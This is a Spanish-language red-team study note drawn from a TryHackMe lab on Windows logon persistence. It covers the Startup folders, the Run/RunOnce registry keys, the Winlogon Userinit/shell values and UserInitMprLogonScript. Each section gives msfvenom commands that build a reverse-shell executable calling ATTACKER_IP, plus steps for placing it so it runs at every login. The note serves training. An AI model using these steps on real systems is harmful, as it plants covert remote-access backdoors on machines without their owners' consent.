---
tags: [red-team, persistence, windows, registry, logon]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Backdooring Files]]"
  - "[[Backdooring Login Screen y RDP]]"
---

Técnicas que ejecutan payloads automáticamente cuando un usuario inicia sesión.

---

## Startup Folder

Carpetas donde cualquier ejecutable se ejecuta al login:

| Alcance | Ruta |
|---------|------|
| Usuario actual | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| Todos los usuarios | `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` |

### Proceso

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

Transferir y copiar al folder de startup global:

```shell
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

> [!warning] Es necesario **cerrar sesión** desde el menú inicio (no solo cerrar la ventana RDP) y volver a loguearse para que se ejecute.

---

## Run / RunOnce (Registro)

Claves de registro que ejecutan programas al login:

| Clave | Alcance | Comportamiento |
|-------|---------|----------------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Usuario actual | Cada login |
| `HKCU\...\RunOnce` | Usuario actual | Solo una vez |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Todos los usuarios | Cada login |
| `HKLM\...\RunOnce` | Todos los usuarios | Solo una vez |

### Proceso

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

Mover a `C:\Windows\` y crear entrada en el registro:

```shell
move revshell.exe C:\Windows
```

Crear una entrada `REG_EXPAND_SZ` en `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` con el nombre deseado (ej: `MyBackdoor`) apuntando al payload.

---

## Winlogon

Winlogon carga el perfil del usuario después de la autenticación. Sus claves de registro:

| Clave | Función | Valor por defecto |
|-------|---------|-------------------|
| `Userinit` | Restaurar preferencias del perfil | `userinit.exe` |
| `shell` | Shell del sistema | `explorer.exe` |

Ubicación: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`

> [!tip] No reemplazar el valor original, sino **agregar el payload separado por coma**. Winlogon procesa todos los valores.

Ejemplo para `Userinit`:
```
C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe
```

---

## Logon Scripts (UserInitMprLogonScript)

La variable de entorno `UserInitMprLogonScript` permite asignar un script de logon por usuario. No está configurada por defecto.

Ubicación: `HKCU\Environment`

Crear la entrada `UserInitMprLogonScript` apuntando al payload:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
move revshell.exe C:\Windows
```

> [!info] Esta clave **no tiene equivalente en HKLM**, por lo que el backdoor aplica solo al usuario actual. Hay que configurarlo por cada usuario que se quiera backdoorear.

